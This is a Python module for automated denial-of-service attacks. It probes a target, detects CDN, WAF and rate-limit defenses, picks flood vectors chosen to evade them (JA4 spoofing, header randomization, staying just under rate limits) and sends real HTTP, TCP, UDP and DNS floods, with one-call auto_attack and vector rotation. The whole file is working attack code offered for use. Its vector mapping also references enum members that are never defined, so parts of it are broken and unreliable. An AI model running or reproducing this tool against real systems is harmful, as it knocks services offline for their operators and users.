"""
NetStress Kill Chain Automation
Intelligent auto-recon and adaptive attack vector selection.

This module implements:
1. Target Probing - Analyze target response patterns
2. Defense Detection - Identify WAF, CDN, rate limiting
3. Vector Selection - Auto-select optimal attack vectors
4. Adaptive Switching - Change vectors to evade detection

The Kill Chain:
  PROBE -> ANALYZE -> SELECT -> ATTACK -> ADAPT -> REPEAT
"""

import asyncio
import socket
import ssl
import time
import random
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum, auto
from collections import deque

logger = logging.getLogger(__name__)


class DefenseType(Enum):
    """Detected defense mechanisms"""
    NONE = auto()
    CLOUDFLARE = auto()
    AKAMAI = auto()
    AWS_SHIELD = auto()
    CLOUDFRONT = auto()
    FASTLY = auto()
    IMPERVA = auto()
    SUCURI = auto()
    RATE_LIMITER = auto()
    WAF_GENERIC = auto()
    CAPTCHA = auto()
    GEO_BLOCK = auto()
    IP_REPUTATION = auto()


class AttackVector(Enum):
    """Available attack vectors"""
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    UDP_FLOOD = "udp_flood"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS_FLOOD = "https_flood"
    SLOWLORIS = "slowloris"
    DNS_AMP = "dns_amp"
    ICMP_FLOOD = "icmp_flood"
    LAYER7_JA4 = "layer7_ja4"  # JA4 spoofed requests
    WEBSOCKET = "websocket"
    HTTP2_FLOOD = "http2_flood"


@dataclass
class ProbeResult:
    """Result of target probing"""
    target: str
    port: int
    is_alive: bool
    response_time_ms: float
    tcp_open: bool
    http_status: Optional[int]
    server_header: Optional[str]
    detected_defenses: List[DefenseType]
    ssl_enabled: bool
    http2_supported: bool
    websocket_supported: bool
    rate_limit_detected: bool
    rate_limit_threshold: Optional[int]
    fingerprint: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AttackStrategy:
    """Recommended attack strategy"""
    primary_vector: AttackVector
    secondary_vectors: List[AttackVector]
    recommended_threads: int
    recommended_rate: int
    use_ja4_spoofing: bool
    use_http2: bool
    rotation_interval: int  # seconds
    evasion_techniques: List[str]
    confidence: float


class KillChainAutomation:
    """
    Automated Kill Chain for intelligent attack orchestration.
    
    Flow:
    1. Probe target with TCP SYN packets
    2. Analyze responses to detect defenses
    3. Select optimal attack vector
    4. Execute attack with adaptive parameters
    5. Monitor and switch vectors every N seconds
    """
    
    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        self.probe_results: List[ProbeResult] = []
        self.current_strategy: Optional[AttackStrategy] = None
        self.vector_history: deque = deque(maxlen=100)
        self.response_history: deque = deque(maxlen=1000)
        self.rotation_interval = 60  # Default: switch vectors every 60 seconds
        self._running = False
        
        # Defense signatures
        self._defense_signatures = {
            DefenseType.CLOUDFLARE: [
                b'cloudflare', b'cf-ray', b'__cfduid', b'cf-cache-status',
                b'cloudflare-nginx', b'1020', b'1015'
            ],
            DefenseType.AKAMAI: [
                b'akamai', b'akamaighost', b'x-akamai', b'aka-'
            ],
            DefenseType.AWS_SHIELD: [
                b'awselb', b'x-amz', b'aws', b'amazon'
            ],
            DefenseType.CLOUDFRONT: [
                b'cloudfront', b'x-amz-cf', b'via: 1.1'
            ],
            DefenseType.FASTLY: [
                b'fastly', b'x-served-by', b'x-cache'
            ],
            DefenseType.IMPERVA: [
                b'incapsula', b'imperva', b'x-iinfo'
            ],
            DefenseType.SUCURI: [
                b'sucuri', b'x-sucuri'
            ],
        }
        
        # Vector effectiveness against defenses
        self._vector_effectiveness = {
            DefenseType.CLOUDFLARE: [
                AttackVector.LAYER7_JA4,
                AttackVector.HTTP2_FLOOD,
                AttackVector.WEBSOCKET,
                AttackVector.SLOWLORIS
            ],
            DefenseType.AKAMAI: [
                AttackVector.LAYER7_JA4,
                AttackVector.UDP_FLOOD,
                AttackVector.DNS_AMP
            ],
            DefenseType.AWS_SHIELD: [
                AttackVector.LAYER7_JA4,
                AttackVector.HTTP2_FLOOD,
                AttackVector.SLOWLORIS
            ],
            DefenseType.RATE_LIMITER: [
                AttackVector.SLOWLORIS,
                AttackVector.WEBSOCKET,
                AttackVector.UDP_FLOOD
            ],
            DefenseType.NONE: [
                AttackVector.TCP_SYN,
                AttackVector.UDP_FLOOD,
                AttackVector.HTTP_GET
            ]
        }
        
    async def probe_target(self, num_probes: int = 50) -> ProbeResult:
        """
        Probe target with TCP SYN packets and HTTP requests.
        
        Args:
            num_probes: Number of probe packets to send
            
        Returns:
            ProbeResult with target analysis
        """
        logger.info(f"Probing target {self.target}:{self.port} with {num_probes} probes...")
        
        tcp_responses = 0
        response_times = []
        http_status = None
        server_header = None
        detected_defenses = []
        ssl_enabled = False
        http2_supported = False
        websocket_supported = False
        rate_limit_detected = False
        rate_limit_threshold = None
        fingerprint = {}
        
        # TCP SYN probes
        for i in range(num_probes):
            try:
                start = time.monotonic()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                result = sock.connect_ex((self.target, self.port))
                elapsed = (time.monotonic() - start) * 1000
                
                if result == 0:
                    tcp_responses += 1
                    response_times.append(elapsed)
                    
                sock.close()
                
                # Small delay between probes
                await asyncio.sleep(0.02)
                
            except Exception as e:
                logger.debug(f"Probe {i} failed: {e}")
                
        # HTTP probe
        try:
            http_result = await self._http_probe()
            http_status = http_result.get('status')
            server_header = http_result.get('server')
            fingerprint['http'] = http_result
            
            # Check for defenses in response
            response_bytes = str(http_result).lower().encode()
            for defense_type, signatures in self._defense_signatures.items():
                for sig in signatures:
                    if sig in response_bytes:
                        detected_defenses.append(defense_type)
                        break
                        
        except Exception as e:
            logger.debug(f"HTTP probe failed: {e}")
            
        # HTTPS probe
        try:
            ssl_result = await self._ssl_probe()
            ssl_enabled = ssl_result.get('enabled', False)
            fingerprint['ssl'] = ssl_result
        except Exception:
            pass
            
        # HTTP/2 probe
        try:
            http2_supported = await self._http2_probe()
        except Exception:
            pass
            
        # WebSocket probe
        try:
            websocket_supported = await self._websocket_probe()
        except Exception:
            pass
            
        # Rate limit detection
        try:
            rate_result = await self._detect_rate_limit()
            rate_limit_detected = rate_result.get('detected', False)
            rate_limit_threshold = rate_result.get('threshold')
            if rate_limit_detected:
                detected_defenses.append(DefenseType.RATE_LIMITER)
        except Exception:
            pass
            
        # Calculate average response time
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        
        # Remove duplicates from detected defenses
        detected_defenses = list(set(detected_defenses))
        
        result = ProbeResult(
            target=self.target,
            port=self.port,
            is_alive=tcp_responses > 0,
            response_time_ms=avg_response_time,
            tcp_open=tcp_responses > num_probes * 0.5,
            http_status=http_status,
            server_header=server_header,
            detected_defenses=detected_defenses,
            ssl_enabled=ssl_enabled,
            http2_supported=http2_supported,
            websocket_supported=websocket_supported,
            rate_limit_detected=rate_limit_detected,
            rate_limit_threshold=rate_limit_threshold,
            fingerprint=fingerprint
        )
        
        self.probe_results.append(result)
        logger.info(f"Probe complete: alive={result.is_alive}, defenses={[d.name for d in detected_defenses]}")
        
        return result
        
    async def _http_probe(self) -> Dict[str, Any]:
        """Send HTTP probe request"""
        import aiohttp
        
        result = {}
        try:
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                url = f"http://{self.target}:{self.port}/"
                async with session.get(url) as response:
                    result['status'] = response.status
                    result['headers'] = dict(response.headers)
                    result['server'] = response.headers.get('Server', '')
                    result['content_type'] = response.headers.get('Content-Type', '')
        except Exception as e:
            result['error'] = str(e)
            
        return result
        
    async def _ssl_probe(self) -> Dict[str, Any]:
        """Probe SSL/TLS configuration"""
        result = {'enabled': False}
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    self.target, 
                    443 if self.port == 80 else self.port,
                    ssl=context
                ),
                timeout=5.0
            )
            
            ssl_obj = writer.get_extra_info('ssl_object')
            if ssl_obj:
                result['enabled'] = True
                result['version'] = ssl_obj.version()
                result['cipher'] = ssl_obj.cipher()
                
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            result['error'] = str(e)
            
        return result
        
    async def _http2_probe(self) -> bool:
        """Check if target supports HTTP/2"""
        try:
            # Try ALPN negotiation
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['h2', 'http/1.1'])
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    self.target,
                    443 if self.port == 80 else self.port,
                    ssl=context
                ),
                timeout=5.0
            )
            
            ssl_obj = writer.get_extra_info('ssl_object')
            selected = ssl_obj.selected_alpn_protocol() if ssl_obj else None
            
            writer.close()
            await writer.wait_closed()
            
            return selected == 'h2'
            
        except Exception:
            return False
            
    async def _websocket_probe(self) -> bool:
        """Check if target supports WebSocket"""
        try:
            import aiohttp
            
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                url = f"ws://{self.target}:{self.port}/"
                try:
                    async with session.ws_connect(url) as ws:
                        return True
                except Exception:
                    pass
                    
        except Exception:
            pass
            
        return False
        
    async def _detect_rate_limit(self) -> Dict[str, Any]:
        """Detect rate limiting by sending burst requests"""
        result = {'detected': False, 'threshold': None}
        
        try:
            import aiohttp
            
            success_count = 0
            blocked_count = 0
            
            timeout = aiohttp.ClientTimeout(total=2)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                url = f"http://{self.target}:{self.port}/"
                
                # Send 100 rapid requests
                for i in range(100):
                    try:
                        async with session.get(url) as response:
                            if response.status == 429 or response.status == 503:
                                blocked_count += 1
                                if not result['detected']:
                                    result['detected'] = True
                                    result['threshold'] = success_count
                            else:
                                success_count += 1
                    except Exception:
                        blocked_count += 1
                        
                    # No delay - we want to trigger rate limiting
                    
        except Exception as e:
            logger.debug(f"Rate limit detection failed: {e}")
            
        return result
        
    def analyze_and_select_vector(self, probe_result: ProbeResult) -> AttackStrategy:
        """
        Analyze probe results and select optimal attack vector.
        
        Args:
            probe_result: Result from target probing
            
        Returns:
            AttackStrategy with recommended approach
        """
        logger.info("Analyzing target and selecting attack vector...")
        
        # Determine primary defense
        primary_defense = DefenseType.NONE
        if probe_result.detected_defenses:
            # Prioritize CDN/WAF detection
            priority_order = [
                DefenseType.CLOUDFLARE,
                DefenseType.AKAMAI,
                DefenseType.AWS_SHIELD,
                DefenseType.IMPERVA,
                DefenseType.RATE_LIMITER
            ]
            for defense in priority_order:
                if defense in probe_result.detected_defenses:
                    primary_defense = defense
                    break
                    
        # Get effective vectors for this defense
        effective_vectors = self._vector_effectiveness.get(
            primary_defense,
            self._vector_effectiveness[DefenseType.NONE]
        )
        
        # Select primary vector
        primary_vector = effective_vectors[0] if effective_vectors else AttackVector.TCP_SYN
        
        # Select secondary vectors
        secondary_vectors = effective_vectors[1:4] if len(effective_vectors) > 1 else []
        
        # Determine if JA4 spoofing should be used
        use_ja4 = primary_defense in [
            DefenseType.CLOUDFLARE,
            DefenseType.AKAMAI,
            DefenseType.AWS_SHIELD,
            DefenseType.IMPERVA
        ]
        
        # Determine if HTTP/2 should be used
        use_http2 = probe_result.http2_supported and primary_defense != DefenseType.NONE
        
        # Calculate recommended parameters
        if probe_result.rate_limit_detected and probe_result.rate_limit_threshold:
            # Stay just under rate limit
            recommended_rate = int(probe_result.rate_limit_threshold * 0.9)
        else:
            recommended_rate = 10000  # Default high rate
            
        # Threads based on response time
        if probe_result.response_time_ms < 50:
            recommended_threads = 100
        elif probe_result.response_time_ms < 200:
            recommended_threads = 50
        else:
            recommended_threads = 20
            
        # Evasion techniques
        evasion_techniques = []
        if use_ja4:
            evasion_techniques.append("ja4_fingerprint_spoofing")
        if probe_result.ssl_enabled:
            evasion_techniques.append("tls_fingerprint_randomization")
        if primary_defense != DefenseType.NONE:
            evasion_techniques.append("header_randomization")
            evasion_techniques.append("timing_jitter")
            
        # Rotation interval based on defense
        if primary_defense in [DefenseType.CLOUDFLARE, DefenseType.AKAMAI]:
            rotation_interval = 30  # Faster rotation for aggressive defenses
        else:
            rotation_interval = 60
            
        # Calculate confidence
        confidence = 0.8 if probe_result.is_alive else 0.3
        if probe_result.detected_defenses:
            confidence *= 0.9  # Slightly lower confidence with defenses
            
        strategy = AttackStrategy(
            primary_vector=primary_vector,
            secondary_vectors=secondary_vectors,
            recommended_threads=recommended_threads,
            recommended_rate=recommended_rate,
            use_ja4_spoofing=use_ja4,
            use_http2=use_http2,
            rotation_interval=rotation_interval,
            evasion_techniques=evasion_techniques,
            confidence=confidence
        )
        
        self.current_strategy = strategy
        
        logger.info(f"Selected strategy: {primary_vector.value} with {len(secondary_vectors)} fallbacks")
        logger.info(f"JA4 spoofing: {use_ja4}, HTTP/2: {use_http2}, Rate: {recommended_rate}")
        
        return strategy
        
    async def execute_kill_chain(self, duration: int = 300) -> Dict[str, Any]:
        """
        Execute the full kill chain automation.
        
        Args:
            duration: Total attack duration in seconds
            
        Returns:
            Attack results and statistics
        """
        logger.info(f"Starting Kill Chain automation for {duration} seconds...")
        
        self._running = True
        start_time = time.monotonic()
        results = {
            'probes': [],
            'vectors_used': [],
            'total_packets': 0,
            'vector_switches': 0,
            'defenses_detected': []
        }
        
        try:
            # Phase 1: Initial probe
            probe_result = await self.probe_target(50)
            results['probes'].append(probe_result)
            results['defenses_detected'] = [d.name for d in probe_result.detected_defenses]
            
            if not probe_result.is_alive:
                logger.warning("Target appears to be down or unreachable")
                return results
                
            # Phase 2: Analyze and select vector
            strategy = self.analyze_and_select_vector(probe_result)
            current_vector = strategy.primary_vector
            results['vectors_used'].append(current_vector.value)
            
            # Phase 3: Attack loop with adaptive switching
            vector_start_time = time.monotonic()
            vector_index = 0
            all_vectors = [strategy.primary_vector] + strategy.secondary_vectors
            
            while self._running and (time.monotonic() - start_time) < duration:
                # Check if it's time to switch vectors
                if (time.monotonic() - vector_start_time) >= strategy.rotation_interval:
                    vector_index = (vector_index + 1) % len(all_vectors)
                    current_vector = all_vectors[vector_index]
                    vector_start_time = time.monotonic()
                    results['vector_switches'] += 1
                    results['vectors_used'].append(current_vector.value)
                    logger.info(f"Switching to vector: {current_vector.value}")
                    
                # Execute REAL attack burst using appropriate engine
                packets_sent = await self._execute_attack_burst(
                    current_vector, 
                    strategy.recommended_rate,
                    burst_duration=1.0
                )
                results['total_packets'] += packets_sent
                
                # Periodic re-probe to detect defense changes
                elapsed = time.monotonic() - start_time
                if elapsed > 0 and int(elapsed) % 120 == 0:  # Re-probe every 2 minutes
                    logger.info("Performing periodic re-probe...")
                    new_probe = await self.probe_target(20)
                    results['probes'].append(new_probe)
                    
                    # Check if defenses changed
                    new_defenses = set(d.name for d in new_probe.detected_defenses)
                    old_defenses = set(results['defenses_detected'])
                    if new_defenses != old_defenses:
                        logger.warning(f"Defense change detected: {new_defenses - old_defenses}")
                        strategy = self.analyze_and_select_vector(new_probe)
                        all_vectors = [strategy.primary_vector] + strategy.secondary_vectors
                        vector_index = 0
                        current_vector = all_vectors[0]
                        
        except Exception as e:
            logger.error(f"Kill chain error: {e}")
            results['error'] = str(e)
            
        finally:
            self._running = False
            
        results['duration'] = time.monotonic() - start_time
        logger.info(f"Kill chain complete: {results['total_packets']} packets, {results['vector_switches']} switches")
        
        return results
        
    async def _execute_attack_burst(
        self, 
        vector: AttackVector, 
        rate: int, 
        burst_duration: float = 1.0
    ) -> int:
        """
        Execute a REAL attack burst using the appropriate engine.
        
        This is NOT a simulation - it sends real packets.
        
        Args:
            vector: Attack vector to use
            rate: Packets per second
            burst_duration: Duration of burst in seconds
            
        Returns:
            Number of packets actually sent
        """
        packets_sent = 0
        
        try:
            # Map vector to attack type
            attack_type = self._vector_to_attack_type(vector)
            
            if attack_type in ('http', 'https'):
                packets_sent = await self._http_burst(rate, burst_duration, attack_type == 'https')
            elif attack_type == 'tcp':
                packets_sent = await self._tcp_burst(rate, burst_duration)
            elif attack_type == 'udp':
                packets_sent = await self._udp_burst(rate, burst_duration)
            elif attack_type == 'dns':
                packets_sent = await self._dns_burst(rate, burst_duration)
            else:
                # Default to HTTP
                packets_sent = await self._http_burst(rate, burst_duration, False)
                
        except Exception as e:
            logger.debug(f"Attack burst error: {e}")
            
        return packets_sent
    
    def _vector_to_attack_type(self, vector: AttackVector) -> str:
        """Map attack vector to attack type string"""
        mapping = {
            AttackVector.HTTP_FLOOD: 'http',
            AttackVector.HTTPS_FLOOD: 'https',
            AttackVector.TCP_SYN: 'tcp',
            AttackVector.TCP_ACK: 'tcp',
            AttackVector.UDP_FLOOD: 'udp',
            AttackVector.DNS_AMPLIFICATION: 'dns',
            AttackVector.SLOWLORIS: 'http',
            AttackVector.RUDY: 'http',
            AttackVector.CACHE_BYPASS: 'http',
        }
        return mapping.get(vector, 'http')
    
    async def _http_burst(self, rate: int, duration: float, use_ssl: bool = False) -> int:
        """Execute real HTTP burst"""
        import aiohttp
        
        packets = 0
        protocol = 'https' if use_ssl else 'http'
        url = f"{protocol}://{self.target}:{self.port}/"
        
        timeout = aiohttp.ClientTimeout(total=duration + 1)
        connector = aiohttp.TCPConnector(limit=min(rate, 100), force_close=True, ssl=False)
        
        end_time = time.monotonic() + duration
        
        try:
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                while time.monotonic() < end_time:
                    tasks = []
                    batch = min(rate // 10, 50)  # Batch requests
                    
                    for _ in range(batch):
                        tasks.append(self._single_request(session, url))
                        
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    packets += sum(1 for r in results if r is True)
                    
                    await asyncio.sleep(0.1)
        except Exception:
            pass
            
        return packets
    
    async def _single_request(self, session, url: str) -> bool:
        """Single HTTP request"""
        try:
            async with session.get(url) as resp:
                await resp.read()
                return True
        except Exception:
            return False
    
    async def _tcp_burst(self, rate: int, duration: float) -> int:
        """Execute real TCP burst"""
        import socket
        
        packets = 0
        end_time = time.monotonic() + duration
        
        while time.monotonic() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect_ex((self.target, self.port))
                sock.send(b"X" * 1024)
                sock.close()
                packets += 1
            except Exception:
                pass
                
            if packets % 100 == 0:
                await asyncio.sleep(0.01)
                
        return packets
    
    async def _udp_burst(self, rate: int, duration: float) -> int:
        """Execute real UDP burst"""
        import socket
        
        packets = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"X" * 1024
        
        end_time = time.monotonic() + duration
        
        while time.monotonic() < end_time:
            try:
                sock.sendto(payload, (self.target, self.port))
                packets += 1
            except Exception:
                pass
                
            if packets % 1000 == 0:
                await asyncio.sleep(0.001)
                
        sock.close()
        return packets
    
    async def _dns_burst(self, rate: int, duration: float) -> int:
        """Execute real DNS burst"""
        import socket
        
        packets = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Simple DNS query for target
        dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        dns_query += b'\x07example\x03com\x00\x00\x01\x00\x01'
        
        end_time = time.monotonic() + duration
        
        while time.monotonic() < end_time:
            try:
                sock.sendto(dns_query, (self.target, 53))
                packets += 1
            except Exception:
                pass
                
            if packets % 500 == 0:
                await asyncio.sleep(0.001)
                
        sock.close()
        return packets
        
    def stop(self):
        """Stop the kill chain execution"""
        self._running = False
        logger.info("Kill chain stopped")


# Convenience functions
async def auto_attack(target: str, port: int = 80, duration: int = 300) -> Dict[str, Any]:
    """
    Fully automated attack with intelligent vector selection.
    
    Args:
        target: Target IP or hostname
        port: Target port
        duration: Attack duration in seconds
        
    Returns:
        Attack results
    """
    kill_chain = KillChainAutomation(target, port)
    return await kill_chain.execute_kill_chain(duration)


def get_recommended_strategy(target: str, port: int = 80) -> AttackStrategy:
    """
    Get recommended attack strategy without executing attack.
    
    Args:
        target: Target IP or hostname
        port: Target port
        
    Returns:
        Recommended AttackStrategy
    """
    kill_chain = KillChainAutomation(target, port)
    
    # Run probe synchronously
    loop = asyncio.new_event_loop()
    try:
        probe_result = loop.run_until_complete(kill_chain.probe_target(30))
        return kill_chain.analyze_and_select_vector(probe_result)
    finally:
        loop.close()
